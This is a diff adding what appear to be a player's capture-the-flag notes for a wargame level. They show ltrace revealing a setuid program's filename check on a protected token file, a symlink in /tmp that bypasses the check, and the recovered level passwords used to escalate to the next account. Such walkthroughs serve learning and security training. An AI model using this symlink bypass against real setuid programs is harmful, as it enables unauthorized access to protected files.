@@ -1,0 +1,20 @@
+su level08
+Password: fiumuikeil55xe9cu4dood66h
+
+ls -la
+-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08  flag08    26 Mar  5  2016 token
+
+ltrace ./level08
+printf("%s [file to read]\n", "./level08"./level08 [file to read]
+ltrace ./level08 token
+strstr("token", "token")                                                  = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+
+ln -s ~/token /tmp/ololo
+./level08 /tmp/ololo
+quif5eloekouj29ke0vouxean
+
+su flag08
+Password: quif5eloekouj29ke0vouxean
+getflag
